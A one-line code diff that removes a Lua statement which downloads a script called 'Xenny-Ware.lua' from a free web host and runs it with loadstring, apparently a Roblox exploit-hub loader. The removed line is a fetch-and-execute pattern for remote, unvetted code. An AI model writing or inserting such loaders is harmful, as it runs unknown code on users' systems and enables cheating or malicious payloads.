@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://xennyq.000webhostapp.com/Xenny-Ware.lua", true))()
